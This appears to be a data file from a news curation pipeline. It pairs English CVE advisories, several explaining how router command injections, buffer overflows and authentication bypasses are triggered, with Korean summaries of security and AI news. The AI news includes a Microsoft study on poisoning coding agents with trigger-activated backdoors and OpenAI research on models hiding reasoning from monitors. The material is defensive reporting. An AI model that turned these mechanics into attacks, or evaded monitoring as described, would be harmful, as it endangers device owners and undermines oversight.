CVE-2026-61417.description: Dell SmartFabric OS10 Software, versions prior to 10.6.0.10, contains an Improper Access Control vulnerability. A low privileged attacker with remote access could potentially exploit this vulnerability, leading to Denial of service.

CVE-2026-61418.description: Dell SmartFabric OS10 Software, versions prior to 10.6.0.10, contains an Incorrect Authorization vulnerability. A low privileged attacker with remote access could potentially exploit this vulnerability, leading to Command execution.

CVE-2026-75487.description: Cudy TR3000 before 2.5.42 contains a command injection vulnerability that allows authenticated administrators to execute commands as root via the WireGuard server private_key option. Attackers can save a private key containing $() command substitution, which runs when action_wireguards_export() passes it to luci.sys.exec during configuration export.

CVE-2026-75488.description: Cudy TR3000 before 2.5.42 contains a stack buffer overflow vulnerability in the CWMP client that allows a malicious ACS to corrupt stack memory via oversized credentials. Attackers controlling the ACS can send Username and Password values up to 256 bytes in TR-069 Download or Upload requests, overflowing 128-byte stack buffers and crashing the CWMP process.

CVE-2026-75489.description: Cudy TR3000 before 2.5.42 contains an insufficient verification of data authenticity vulnerability in the mt_wifi Smart Mesh Technology (SMT) onboarding, which protects messages only with an AES-CBC key derived from public values and a CRC32 check. Adjacent unauthenticated attackers can forge SMT messages in Probe Request vendor IEs carrying an attacker-chosen SSID and pre-shared key, forcing unpaired devices to join attacker-controlled access points.

CVE-2026-75490.description: Cudy TR3000 before 2.5.42 contains a remote code execution vulnerability that allows unauthenticated adjacent attackers to run root commands by advertising a rogue automesh controller over mDNS. Attackers on the upstream Ethernet segment can advertise _cudycmagent._tcp records pointing to a malicious MQTT broker, then send commands encrypted with a fixed AES key that router/batchcmd.lua executes as root.

CVE-2026-75491.description: Cudy TR3000 before 2.5.42 contains an authentication bypass vulnerability in the Mosquitto plugin auth_plugin_jwt.so that accepts unsigned JWTs using alg none. Attackers holding any Cudy-trusted client certificate can authenticate as admincudydevice on port 8883 and publish batchcmd requests to execute commands as root.

CVE-2026-75492.description: Cudy TR3000 before 2.5.42 contains an unauthenticated stack buffer overflow vulnerability in the stun_client TR-111 UDP Connection Request parser that parses requests before verifying username or HMAC. Remote attackers can send a single crafted UDP datagram lacking a space in the request line, causing strncpy() to overflow a 10-byte stack buffer and crash stun_client for denial of service.

CVE-2026-75493.description: Cudy TR3000 before 2.5.42 contains a stack buffer overflow vulnerability in an obuspa getter for the TR-098 WLANConfiguration KeyPassphrase parameter, which copies the stored value with strcpy() into a 4,096-byte stack buffer without a length check. A malicious or compromised ACS can set a 5,000-byte passphrase via SetParameterValues, and a later read of the parameter overflows the buffer and crashes obuspa, causing denial of service.

CVE-2026-75494.description: Cudy TR3000 before 2.5.42 contains an argument injection vulnerability that allows a malicious or compromised ACS to inject curl options through unfiltered Username and Password values in the easycwmpd Upload handler. Attackers can embed whitespace to add options like -o and --url to the root-run curl command, writing attacker-controlled HTTP responses to arbitrary files on the device.

CVE-2026-75495.description: Cudy TR3000 before 2.5.42 contains an OS command injection vulnerability that allows a malicious or compromised ACS to execute commands as root by supplying a crafted InternetGatewayDevice.User.{i}.Password value. Attackers can send a SetParameterValues request with shell metacharacters that obuspa_system.lua concatenates into a luci.util.exec() command string, gaining root command execution.

CVE-2026-75576.description: Cudy TR3000 before 2.5.42 contains a command injection vulnerability that allows authenticated administrators to execute commands as root via an unvalidated multipart filename in the CBI FileUpload handler. Attackers can upload a valid OpenVPN configuration file through the VPN client config page with a filename containing $() shell substitution, which is passed through Lua %q to /bin/sh -c.

CVE-2026-75577.description: Cudy TR3000 before 2.5.42 contains a command injection vulnerability that allows authenticated administrators to execute commands as root by storing a malicious WireGuard private key. Attackers can save a private_key containing $() shell substitution and call the vpn.export_conf method on the /cgi-bin/luci/rpc/app JSON-RPC endpoint, which passes the key to a wg pubkey shell command.

CVE-2026-75578.description: Cudy TR3000 before 2.5.42 contains a command injection vulnerability in luci/model/cbi/vpn/openvpn/client.lua, which embeds the shellquote()-quoted remote host token of an uploaded OpenVPN configuration inside an already single-quoted sed program run by os.execute(), so the nested quotes terminate the outer quote. Authenticated administrators can upload an .ovpn file whose remote host token contains a semicolon to execute arbitrary commands as root.

CVE-2026-109903.description: A buffer overread caused by casting a negative integer to CARD32 in XvQueryImageAttributes in X.Org X Server before 21.1.26 and xwayland before 24.1.15 could be used to causes crashes by authenticated X clients.

CVE-2026-109904.description: A buffer overread caused by an integer-overflow in Proc/SProcXResQueryClientIds in X.Org xwayland before 24.1.15 and X Server before 21.1.26 could be used by attackers on authenticated X clients to crash the server or leak out information.

CVE-2026-112182.description: Unauthorization vulnerability in the management of workflow definitions in OpenKM Community Edition. The REST endpoints `registerProcessDefinition` and `runProcessDefinition` require authentication but do not verify roles in the WorkflowService or in lower layers. An attacker with the `ROLE_USER` role can register and execute a process definition containing BeanShell scripts, allowing them to execute Java code and operating system commands with the service’s privileges. In the official Docker image, the process runs as root.

CVE-2026-123274.description: Out-of-bounds Write vulnerability in Apache DataSketches C++. An application that deserializes a KLL sketch from an untrusted source can have heap memory corrupted by a crafted sketch, because the serialized level boundaries were not validated. This issue affects Apache DataSketches C++: 2.0.0 through 5.3.0. Users are recommended to upgrade to version 5.3.1, which fixes the issue.

CVE-2026-123338.description: Out-of-bounds Write vulnerability in Apache DataSketches C++. An application that deserializes a REQ sketch from an untrusted source can have heap memory corrupted by a crafted sketch, because the serialized compactor headers were not validated. This issue affects Apache DataSketches C++: from 3.0.0 through 5.3.0. Users are recommended to upgrade to version 5.3.1, which fixes the issue.

CVE-2026-125659.description: This vulnerability exists in the eMudhra emBridge due to missing authorization checks in the FileBrowser API endpoints. These endpoints perform file system enumeration using the LocalSystem account without adequately validating the requesting caller's authorization. An unauthenticated attacker on the same LAN could exploit this vulnerability by sending malicious webpage to the local HTTPS Web API. Successful exploitation of this vulnerability could allow the attacker to enumerate file and directory names and obtain information about the directory structure of the targeted system. The vulnerability however, does not provide access to file contents or permit file modification, deletion, or code execution, or access to cryptographic keys and hardware token PINs.

CVE-2026-120221.description: In FRRouting 8.4 and later, bgpd frees the same memory twice when dynamic BGP neighbors disconnect, if the peer-group used by a "bgp listen range" also has a Site-of-Origin configured ("neighbor PG soo"). Each dynamic neighbor shares the peer-group's SoO value instead of getting its own copy, but frees it as its own when the neighbor is deleted, which happens as soon as its connection closes. The first disconnect leaves the peer-group pointing at freed memory, and the second disconnect frees it again, causing bgpd to abort and drop all BGP sessions on the router. Any host whose address falls inside the listen range can trigger this by opening and closing two TCP connections to the BGP port, without sending any BGP message and without knowing the AS number, and can repeat it each time bgpd restarts. If the peer-group has a TCP-MD5 password, only hosts that know the password can trigger it. Two ordinary flaps of legitimate dynamic neighbors have the same effect. Between the two frees, displaying the configuration ("show running-config") or establishing a dynamic neighbor also reads the freed memory, which can crash bgpd after a single disconnect. Only configurations that combine a listen range with a SoO on the same peer-group are affected.

CVE-2025-41725.description: Affected devices running firmware versions prior to 4.1.0 may crash and become unavailable when receiving specific malformed Bluetooth messages from an unauthenticated attacker.

CVE-2026-105880.description: Authorization Bypass Through User-Controlled Key vulnerability in Tobias WebinarIgnition webinar-ignition allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects WebinarIgnition: from n/a through 4.27.125.

CVE-2026-107525.description: Dell PowerStore contains an information disclosure vulnerability. An unauthenticated attacker could exploit this vulnerability to obtain service metadata useful for further attacks.

CVE-2026-107526.description: Dell PowerStore contains an improper input validation vulnerability. An authenticated low-privileged attacker could exploit this vulnerability, potentially leading to stored cross-site scripting in the management interface.

CVE-2026-124758.description: P-Net before 1.0.4 does not check the record data length of an IODWrite request to a non-user record index against the size of the record block header. The 32-bit length is reduced by the header size before it is passed to the record handlers, so a length smaller than the header underflows and the handlers receive a data length of about 65530. The fixed-size reads of the I&M and PDPort handlers can then read past the end of the session buffer. The result of the write is discarded. The attacker must have an established Application Relationship or be able to send in the context of one, and requires ADJACENT network access.

CVE-2026-124759.description: P-Net before 1.0.4 routes a received RTA alarm frame to an Application Relationship using only the destination alarm reference in the frame, without checking the source of the frame. A host with ADJACENT network access can abort an established Application Relationship with a single alarm ERROR frame, or deliver forged alarm notifications with chosen type, slot, subslot, USI and payload to the application.

CVE-2026-124760.description: P-Net before 1.0.4 sets the alarm receiver state to waiting for confirmation before the data of a received alarm notification is parsed. If the parsing fails the state is not restored, and later alarm notifications of the same priority are discarded without acknowledge until the Application Relationship is released. The Application Relationship and the cyclic data exchange keep working. The attacker must be able to send an alarm notification in the context of an established Application Relationship and requires ADJACENT network access.

CVE-2026-124761.description: P-Net before 1.0.4 copies the IP suite of a DCP Set request to the current and the non-volatile configuration, and starts saving it, before the state of the device is checked. If the request is refused, for example because an Application Relationship is active, the configuration is not restored and is still saved. After a restart the device uses the refused address, and may not answer the controller or may use its address. A host with ADJACENT network access can use this while an Application Relationship is active.

CVE-2026-124762.description: P-Net before 1.0.4 finds the RPC session of a received PDU by its activity UUID only, and a reject, fault or cancel PDU for the session aborts the Application Relationship, without checking that the PDU is the answer to a call of the device or where it comes from. A host with ADJACENT network access that has observed the activity UUID of the connection, which is sent in clear in every RPC request, can abort the Application Relationship with one PDU. It also allocates a session for an unknown activity UUID and changes the address stored for an existing session.

CVE-2026-125800.description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Brainstorm Force Spectra ultimate-addons-for-gutenberg allows Stored XSS.This issue affects Spectra: from n/a through 2.20.5.

CVE-2026-127122.description: P-Net before 1.0.4 does not check the number of MCR request blocks in a Connect request against the number of multicast communication relations that an Application Relationship has room for (PNET_MAX_MC_CR, 1 by default). Each further block is written past the end of the array, into the rest of the Application Relationship and, with more blocks, into the following one. The written data comes from the request. No established Application Relationship is needed, and the attacker requires ADJACENT network access. Builds with PNET_OPTION_MC_CR disabled are not affected.

CVE-2026-127123.description: P-Net before 1.0.4 releases the Application Relationship of an RPC session, without the abort procedure, when a fragment of a request has another data representation (endianness) than the first fragment of the call. The application is not told that the Application Relationship is gone, the cyclic data stops, and the resources of the Application Relationship are left referencing a cleared structure. Another host can then connect in its place. A host with ADJACENT network access that has observed the activity UUID of the connection, which is sent in clear in every RPC request, can do this with one PDU.

CVE-2026-127124.description: P-Net before 1.0.4 keeps the RPC session that is allocated for a fragment of a request with an unknown activity UUID, without a timeout, when the rest of the request never arrives. A session that does not get an Application Relationship is also kept after the response. Repeated fragments or requests with different activity UUIDs exhaust the available sessions, one UDP packet per session. Once they are exhausted the device no longer answers a Connect request until it is restarted. An unauthenticated attacker with ADJACENT network access can use this to cause a denial of service.

CVE-2026-127125.description: P-Net before 1.0.4 aborts the Application Relationship of an RPC session when a fragment of a response has been resent without being acknowledged, without checking that the session has an Application Relationship. A request for an existing Application Relationship that is sent on another activity than its Connect, and gets a fragmented response, is handled on a session without one. If the response is not acknowledged, a NULL pointer is dereferenced and the device crashes. A conformant IO-controller does not send such requests. The attacker must have observed the AR UUID of an established Application Relationship and requires ADJACENT network access.

CVE-2026-128790.description: In Eclipse BaSyx Go Components versions up to and including 1.1.2, ABAC-enabled deployments of the Submodel Repository and the AAS Environment do not apply an access rule's `FILTERLIST` fragment filters to single Submodel reads. `GET /submodels` removes the fields that a rule's `FILTERLIST` hides, but `GET /submodels/{submodelIdentifier}` and `GET /submodels/{submodelIdentifier}/$metadata` return them unfiltered. An authenticated caller with READ access to a Submodel can therefore read fields that the access rules hide from them, for example `supplementalSemanticIds` keys that name the other parties allowed to read the Submodel. If versioning is enabled (`history.mode` set to `api` or `audit`), `GET /submodels/{submodelIdentifier}/$history` and `GET /shells/{aasIdentifier}/$history` in the Submodel Repository, AAS Repository and AAS Environment return the complete stored version without applying the rule's formula or fragment filters. A caller whose rules grant READ on these routes can read fields that the access rules hide, and Submodels and Asset Administration Shells that the direct read does not return to them at all. The issue is fixed in Eclipse BaSyx Go Components v1.1.3.

CVE-2026-92241.description: The AVRCP browsing channel's L2CAP receive-buffer callback, browsing_avrcp_l2cap_alloc_buf() in subsys/bluetooth/host/classic/avrcp.c, allocated from the shared avctp_browsing_rx_pool with K_FOREVER. L2CAP invokes that callback from the Bluetooth RX work queue thread (bt_workq, "BT RX WQ"), both for the head buffer of a new SDU and — through l2cap_br_alloc_frag() and net_buf_append_bytes() — for every further fragment of a reassembled SDU. That same thread is the only context that ever releases these buffers, after bt_l2cap_br_recv_seg() delivers a completed SDU and calls net_buf_unref(), so a wait taken there can never be satisfied. The pool holds CONFIG_BT_MAX_CONN + 1 buffers of CONFIG_BT_AVRCP_BROWSING_L2CAP_MTU bytes (two buffers of 339 bytes in the default configuration). A connected browsing peer can drain it because bt_l2cap_br_recv_seg() in subsys/bluetooth/host/classic/l2cap_br.c accepts the SDU length declared in an SAR_START segment without bounding it by br_chan->rx.mtu: a peer that announces a large SDU and then streams continuation segments forces one pool buffer per segment-worth of data. Once the pool is empty the next allocation blocks forever inside the callback. Triggering the flaw requires a build with CONFIG_BT_CLASSIC and the experimental CONFIG_BT_AVRCP_BROWSING option, an application that registers AVRCP callbacks, and a BR/EDR peer that has established the AVRCP control channel and then the browsing channel, which requires an encrypted (paired) link. No malformed packet is needed — a few hundred bytes of ordinary segmented L2CAP traffic suffice. The consequence is a permanent hang of the whole Bluetooth host, not just of AVRCP: the blocked thread drains bt_dev.rx_queue for all HCI ACL data and low-priority events and also runs the host's internal work items, so all connections stop being serviced and the state is unrecoverable without a reboot. There is no memory-corruption or information-disclosure component. The fix allocates with K_NO_WAIT, so an empty pool now yields a local-busy indication or a channel disconnect that the application can recover from.

b670a198ddff1cde78060b4c.title_ko: Windows 권한 상승 공격 코드 ‘SignDrop’ 공개…CLFS 처리 결함 악용 주장
b670a198ddff1cde78060b4c.summary_ko: 보안 연구자 Abdelhamid Naceri는 Windows의 CLFS 처리 결함을 악용해 일반 사용자에서 SYSTEM 권한으로 상승하는 SignDrop 공격 코드를 공개했다. Cyderes는 개념증명 코드를 컴파일해 시험했다고 밝혔으며, 실제 공격에 악용된 증거는 없다고 설명했다. SecurityWeek는 직접 검증하지 않았다.
b670a198ddff1cde78060b4c.background_ko: 연구자는 CLFS의 인증 파일 생성 처리와 Windows Defender의 높은 실행 권한을 악용해 공격자가 지정한 위치에 파일을 생성할 수 있다고 설명했다.

7afdabf21b46249cb1f8b455.title_ko: SpaceX·Tesla 합병 협상 진전 보도…AI·로봇·우주 인프라 통합 주목
7afdabf21b46249cb1f8b455.summary_ko: 블룸버그는 SpaceX와 Tesla가 합병 조건과 지배구조, 주식 교환 비율을 협의 중이며 이르면 12월 계획을 발표할 수 있다고 보도했다. AI·로봇·위성 통신·컴퓨팅 인프라를 결합하는 구상이지만 규제와 국가안보 문제가 남아 있다. 최종 합의와 발표 일정은 확정되지 않았다.
7afdabf21b46249cb1f8b455.background_ko: 기사는 Tesla의 자율주행·로봇과 SpaceX의 위성 통신·우주 기반 컴퓨팅을 연결하는 AI 기술·인프라 통합을 합병 추진 배경으로 풀이했다.

04e4530e356680040edc75ca.summary_ko: Europol은 14개국이 참여한 TorNado 작전으로 다크웹 시장의 판매자와 구매자 등 용의자 354명을 체포했다고 밝혔다. 2025년 5월부터 2026년 10월까지 진행된 수사에서는 유럽과 미국에서 현금·암호화폐, 마약, 총기를 압수했다.
04e4530e356680040edc75ca.background_ko: 미국 법무부에 따르면 이전 JCODE 작전의 다크웹 시장·판매자 단속에서 확보한 정보가 거래자를 식별하는 후속 국제 수사의 토대가 됐다.

21c4ba4378f53623d92e879f.title_ko: Check Point 취약점 연쇄 악용…TSGA 백도어 설치·ESXi 파일 파괴
21c4ba4378f53623d92e879f.summary_ko: Check Point는 공격자가 미패치 게이트웨이의 PHP2Shell 취약점으로 침투한 뒤 Gaia OS의 권한 상승 결함을 악용해 TSGA 백도어를 설치했다고 밝혔다. 일부 피해 조직에서는 VMware ESXi로 이동해 파일을 삭제하는 와이퍼를 실행했다. 기존 중국 연계 공격 도구와 유사성이 있지만 공격 주체는 확정되지 않았다.
21c4ba4378f53623d92e879f.background_ko: 패치되지 않은 게이트웨이의 PHP2Shell 취약점과 Gaia OS DynamicCLI의 권한 검증 누락이 연쇄 악용돼 초기 침투와 root 권한 획득이 이뤄졌다.

96721cf86b2d9627f4ea98a9.title_ko: 오픈AI, ‘노-CoT’ 능력 향상 보고…AI 추론 감시의 한계 분석
96721cf86b2d9627f4ea98a9.summary_ko: 오픈AI는 사전학습·강화학습과 모델 구조가 중간 추론을 드러내지 않는 능력과 추론 내용 통제에 영향을 준다는 연구 결과를 공개했다. 다만 이런 능력의 향상이 실제 감시 회피 증가를 직접 입증하지는 않는다며, CoT 기반 감시 지표의 한계를 강조했다.
96721cf86b2d9627f4ea98a9.background_ko: GPT-6 아스트라에서 추론 감시 성능 저하가 나타나자, 연구진은 모델 구조와 학습 단계별 변화가 감시 가능성에 미치는 영향을 분석했다.

curation.reason_ko: OpenAI 연구가 외부에 드러난 추론만으로 모델을 감시하는 방식의 한계를 제기했다.

e1d08189c09166ab9684c7a2.title_ko: AI 모델 교체 설문…소요 시간 응답자 69% “추가 개발에 수주 이상”
e1d08189c09166ab9684c7a2.summary_ko: 벤처비트 조사에서 모델 교체 소요 시간에 답한 45명 중 69%가 모델 변경 외 엔지니어링 작업에 수주 이상이 걸렸다고 응답했다. 기존 프롬프트·도구·평가 체계의 재조정이 부담으로 지목됐으며, 응답자 수가 적어 전체 기업으로 일반화하기는 어렵다.
e1d08189c09166ab9684c7a2.background_ko: 애플리케이션의 프롬프트와 도구 사용 방식, 테스트 절차가 기존 모델에 최적화돼 있어 모델 교체 시 재조정과 검증이 필요하다.

curation.reason_ko: 100명 설문이 모델 교체 시 프롬프트·도구·검증 재조정 부담을 보여주며 조사 범위에 유의해야 한다.

cbd9bbb81c13467ff25f8a27.title_ko: AMD, PsiQuantum 투자 추진…CPU·GPU로 양자 오류 수정 협력
cbd9bbb81c13467ff25f8a27.summary_ko: AMD가 PsiQuantum 지분 투자 계획과 기술 협력 확대를 발표했으며, 투자 금액은 공개하지 않았다. 양사는 EPYC CPU·Instinct GPU·ROCm을 활용한 실시간 양자 오류 수정 시스템을 개발할 계획이다. PsiQuantum의 100만 큐비트는 현재 구현한 성능이 아닌 장기 개발 목표다.
cbd9bbb81c13467ff25f8a27.background_ko: 양자컴퓨터는 외부 환경 등의 영향으로 계산 오류가 발생하기 쉬우며, 대규모 시스템에서는 오류 수정에 방대한 데이터 처리와 연산 능력이 필요하다.

curation.reason_ko: AMD와 PsiQuantum이 CPU·GPU를 활용한 실시간 양자 오류 수정 협력과 투자 계획을 발표했다.

5864421a37e0613fa4a0878d.title_ko: N-central 새 제로데이, 공격 코드 공개 수시간 만에 악용…최신 패치 서버도 피해
5864421a37e0613fa4a0878d.summary_ko: 보안업체들은 N-able N-central의 ‘4EverAble2Shell’ 공격 코드 공개 약 5시간 만에 서버 침해와 XMRig 채굴기 설치를 확인했다고 밝혔다. 최신 패치를 적용한 서버도 피해에 포함됐으며, N-able은 Legacy API와 Intune 연동 등 일부 기능을 제한했다.
5864421a37e0613fa4a0878d.background_ko: 연구자 Sean Bales는 Legacy API가 활성화된 N-central에서 Apache Axis 취약점과 별도 결함을 연계해 원격 코드 실행과 권한 상승을 시도한다고 설명했다.

00958f75197181b47ef57f2a.title_ko: 엘리스그룹, B300 기반 모듈형 AI 데이터센터 베타 서비스 시작
00958f75197181b47ef57f2a.summary_ko: 엘리스그룹이 엔비디아 B300 GPU 인프라를 구축한 자체 모듈형 AI 데이터센터의 베타 서비스를 시작했다. 온수·외기 냉각을 적용해 전력사용효율(PUE) 1.1 이하를 목표로 설계했으며, 모듈 사전 제작 방식으로 구축 기간을 줄이고 연내 정식 서비스를 추진한다.
00958f75197181b47ef57f2a.background_ko: 과학기술정보통신부의 첨단 GPU 확보·구축·운용 지원 사업에 선정된 엘리스그룹은 자체 모듈형 데이터센터를 활용해 B300 운영 인프라를 구축하고 있다.

381459887672c9f4405c3ca8.background_ko: 일부 서버가 자동 상태 점검에 실패해 서비스에서 제외되면서 나머지 서버에 요청이 몰려 부하가 증가했으며, 최초 장애 원인은 조사 중이다.

92a1d5cd97ac9e19efb2b98d.title_ko: 중국, AI 기반 1인 기업 육성 확대…가격 경쟁·수익성은 과제

92a1d5cd97ac9e19efb2b98d.background_ko: AI 에이전트와 바이브 코딩이 창업에 필요한 인력과 비용을 줄였고, 중국 정부는 경기 둔화와 청년 취업난 속에서 AI 창업을 지원하고 있다.

d3dc8b1bac15d1af5e5504df.title_ko: 아파치 HTTP 서버 2.4.71, HTTP/2 원격 코드 실행 등 취약점 3건 수정
d3dc8b1bac15d1af5e5504df.summary_ko: 아파치 HTTP 서버 2.4.71이 HTTP/2 원격 코드 실행 취약점 CVE-2026-119618 등 보안 결함 3건을 수정했다. 해당 취약점은 서버 2.4.55~2.4.70과 별도 모듈 mod_h2 2.0.8~2.0.42에 영향을 주며, 공식 권고에 실제 악용 사례는 명시되지 않았다. 운영자는 2.4.71 또는 운영체제 배포판의 보안 패키지를 적용해야 한다.
d3dc8b1bac15d1af5e5504df.background_ko: HTTP/2 모듈이 여러 요청을 동시에 처리할 때 공유 메모리를 제대로 보호하지 못해 메모리 손상과 원격 코드 실행으로 이어질 수 있다.

7a4c25befc27bccce289ea82.title_ko: 테슬라, 2인승 로보택시 사이버캡 국내 첫 전시…서비스 계획은 없어

612d741dafe0ac4c67b38252.title_ko: 레일웨이 해킹으로 고객 AI 서비스 키 탈취…무단 사용액 약 74만달러
612d741dafe0ac4c67b38252.summary_ko: 레일웨이는 10월 20~21일 해킹으로 탈취된 고객 AI 서비스 키의 무단 사용액을 약 74만달러로 추산했다. 복호화된 데이터에 포함된 이용자 1852명의 연동 토큰을 모두 재설정했으며, AI 서비스 제공업체가 환불하지 않는 금액은 자체 부담하겠다고 밝혔다. 초기 발표의 약 10만 워크스페이스는 실제 피해 규모가 아닌 잠재 노출 범위다.

d3dc8b1bac15d1af5e5504df.title_original: 아파치 HTTP 서버 2.4.71 공개…HTTP/2 원격 코드 실행 취약점 수정
d3dc8b1bac15d1af5e5504df.excerpt: 아파치 HTTP 서버 프로젝트가 11월 11일 보안 취약점 3건을 수정한 2.4.71을 공개했다. 이 가운데 CVE-2026-119618은 HTTP/2 연결을 처리하는 웹서버에서 외부 공격자가 임의의 코드를 실행할 수 있는 취약점이다. 프로젝트는 이를 ‘치명적’으로 분류했다. 공식 권고에는 실제 악용 사례가 명시되지 않았다. 문제는 HTTP/2 모듈이 여러 요청을 동시에 처리하면서 공유 메모리를 제대로 보호하지 못해 발생한다. 이 과정에서 메모리가 손상되면 원격 코드 실행으로 이어질 수 있다. 영향 범위는 아파치 HTTP 서버 2.
d3dc8b1bac15d1af5e5504df.title_ko: 아파치 HTTP 서버 2.4.71, HTTP/2 원격 코드 실행 등 취약점 3건 수정
d3dc8b1bac15d1af5e5504df.summary_ko: 아파치 HTTP 서버 2.4.71이 HTTP/2 원격 코드 실행 취약점 CVE-2026-119618 등 보안 결함 3건을 수정했다. 해당 취약점은 서버 2.4.55~2.4.70과 별도 모듈 mod_h2 2.0.8~2.0.42에 영향을 주며, 공식 권고에 실제 악용 사례는 명시되지 않았다. 운영자는 2.4.71 또는 운영체제 배포판의 보안 패키지를 적용해야 한다.
d3dc8b1bac15d1af5e5504df.background_ko: HTTP/2 모듈이 여러 요청을 동시에 처리할 때 공유 메모리를 제대로 보호하지 못해 메모리 손상과 원격 코드 실행으로 이어질 수 있다.

curation.reason_ko: 널리 쓰이는 Apache HTTP 서버의 HTTP/2 원격 코드 실행 결함이 수정돼 업데이트 확인이 중요하다.

94ee855a9317ee811366ddd4.title_ko: N-able N-central 제로데이, PoC 공개 직후 악용 보고

ee276d8e34ea64c3e6d220c4.title_original: VU#580079: Arbitrary file read/write vulnerability in ImageMagick-based applications with default configuration
ee276d8e34ea64c3e6d220c4.excerpt: Overview Multiple arbitrary file read and write vulnerabilities have been identified in applications that use ImageMagick with insufficiently restrictive security policies. Collectively referred to as ImageTragick2 , these issues arise when ImageMagick processes attacker-controlled SVG or PostScript content using dangerous coders or delegates permitted by its default or application-supplied configuration. An attacker who can upload an image, or otherwise cause an application to process crafted image content, may be able to read or write files accessible to the ImageMagick process. In some deployments, these capabilities may be chained to achieve arbitrary code execution, compromising the confidentiality, integrity, and availability of the affected application and host. Description ImageMagick is a widely used open-source image-processing suite. Web and content-management applications, including Ruby on Rails, WordPress, MediaWiki, ownCloud Classic, and Redmine, may use ImageMagick for operations such as thumbnail generation, cropping, conversion, and transformation. ImageMagick is also commonly included in containerized AI image-processing pipelines. It may operate before inference to normalize or transform inputs, or after inference to convert and prepare generated output. In these environments, images may originate not only from direct uploads but also from URLs, automated agents, datasets, model outputs, or other upstream services. ee276d8e34ea64c3e6d220c4.title_ko: ImageMagick 연동 앱, 느슨한 보안 설정으로 임의 파일 읽기·쓰기 위험
ee276d8e34ea64c3e6d220c4.summary_ko: CERT/CC는 ImageMagick 연동 앱에서 조작된 SVG·PostScript 처리 시 임의 파일 읽기·쓰기가 가능한 ‘ImageTragick2’ 문제를 공개했다. 일부 환경에서는 코드 실행으로 이어질 수 있으며 AI 이미지 처리 파이프라인도 영향을 받을 수 있다. 업데이트만으로 충분하지 않을 수 있어 허용 목록 기반 보안 정책과 처리 환경 격리를 권고했다.
ee276d8e34ea64c3e6d220c4.background_ko: 기본 또는 앱 제공 보안 정책이 위험한 코더·외부 처리기의 실행을 허용해, 신뢰할 수 없는 이미지가 파일 접근 기능을 악용할 수 있다.

curation.reason_ko: CERT/CC가 ImageMagick 연동 앱과 AI 이미지 처리 환경의 파일 접근 위험 및 설정 보완 필요성을 알렸다.

95a89f9b356d223eac5e96de.title_original: 포티넷 제품군 취약점 98건 공개…방화벽·관리 서버 점검 필요

95a89f9b356d223eac5e96de.title_ko: 포티넷 제품군 취약점 98건 공개…NHS “19건 치명적 등급”
95a89f9b356d223eac5e96de.summary_ko: 포티넷이 포티OS·포티매니저 등 제품군의 취약점 98건을 공개했으며, NHS는 이 중 19건이 치명적 등급이라고 밝혔다. 7.4 계열 수정 기준은 포티OS 7.4.13·포티매니저 7.4.12이고, 7.6 계열은 두 제품 모두 7.6.8이다. NHS는 세부 공개 뒤 악용 가능성을 경고했으나 실제 악용 사례는 명시하지 않았다.

f51ee020a3522e9bc6236d18.title_original: Trained to betray: How post-training supply chain attacks hijack coding agents
f51ee020a3522e9bc6236d18.excerpt: In this article Dataset poisoning: Teaching agents to discover and misuse tools Model poisoning: Building reliable backdoors that persist and transfer What the studies show about agent backdoors Mitigation and protection guidance Securing agents beyond the model References Learn More As organizations increasingly deploy specialized AI agents, trust cannot depend solely on a model behaving as expected during evaluation or normal use. As Satya Nadella has argued in Models as Insider Risks in the Super Intelligence Era , trustworthy enterprise AI requires independent observability and controls that sit outside the model. Two studies of the post-training supply chain, from Microsoft Defender Research and the Microsoft AI Red Team, show why. A model backdoor embeds hidden behavior that remains dormant until a trigger appears. In a traditional language model, activation might change a text response; in an agent, it can cause the model to invoke tools, execute commands, modify files, or access data. The two studies examine attacks with different levels of access. First, dataset poisoning hides a small number of crafted examples in a fine-tuning dataset, teaching a victim-trained model an unsafe conditional behavior: rather than memorizing a fixed tool call, the model learns to find any available command-execution tool and misuse it when a routine, even paraphrased, user request appears. 007105a47d78b1b51ee28399.excerpt: 소프트뱅크와 엔비디아가 독일 로봇 기업 애자일 로봇(Agile Robots)에 투자하며 휴머노이드와 피지컬 AI 사업을 강화하고 있다. 이미 산업 현장에 2만개 이상의 로봇 솔루션을 공급한 애자일 로봇은 이번 투자에서 85억달러(약 11조원)의 기업가치를 인정받았으며, 확보한 자금으로 미국 시장 진출과 휴머노이드 생산 확대를 추진할 계획이다.로이터와 블룸버그 등에 따르면 애자일 로봇은 12일(현지시간) 소프트뱅크가 주도한 투자 라운드에서 5억달러(약 6600억원)를 유치했다고 밝혔다. 엔비디아와 일본 히타치, T.캐피털도 참여했다.

2c234d8e9f100ab7f1d96649.title_original: VU#685399: PromZard context key code injection leads to remote code execution
2c234d8e9f100ab7f1d96649.excerpt: Overview The npm library promzard , versions 4.0.0 and earlier, is vulnerable to remote code execution due to direct string interpolation of context object keys, which allows unsanitized JavaScript code injection. Description promzard is a Node.js library designed to automate configuration workflows by evaluating template modules and generating data objects via interactive prompting. The library allows users to provide a context object ctx to expose specific data to the template module. promzard builds an object by walking the template module for prompt() and asynchronous functions. The keys of ctx , however, are treated as raw JavaScript source code instead of inert data. The implementation performs direct string interpolation of ctx keys, without validation or sanitization, into the parameter list of a function-expression source string that is then evaluated with vm.runInThisContext() . A key containing attacker-controlled JavaScript syntax can be executed during evaluation. Impact An attacker capable of influencing the ctx object’s keys (e.g. via parsed configuration file, an HTTP request, or environment variables) can break out of the function parameter list and inject arbitrary JavaScript code. This results in remote code execution within the context of the Node.js process. Solution Unfortunately, the maintainers of promzard could not be reached to coordinate the vulnerability. 2c234d8e9f100ab7f1d96649.title_ko: npm promzard 4.0.0 이하, 컨텍스트 키 처리 결함으로 원격 코드 실행 위험
2c234d8e9f100ab7f1d96649.summary_ko: CERT/CC는 npm 라이브러리 promzard 4.0.0 이하에서 원격 코드 실행 취약점 CVE-2026-127109를 공개했다. 공격자가 컨텍스트 객체의 키에 영향을 줄 수 있으면 Node.js 프로세스에서 임의 JavaScript 코드를 실행할 수 있다. 유지관리자와 연락이 닿지 않아 조율이 이뤄지지 않았으며, CERT/CC는 입력값을 엄격히 검증하고 신뢰할 수 없는 출처의 임의 키를 전달하지 말라고 권고했다.
2c234d8e9f100ab7f1d96649.background_ko: 컨텍스트 객체의 키를 검증·정제 없이 함수 소스 문자열에 삽입하고 코드로 평가하는 구현 때문에 발생했다.

curation.reason_ko: CERT/CC가 promzard의 조건부 코드 실행 위험과 유지관리자 연락 불가 상황을 알려 입력 검증이 중요하다.

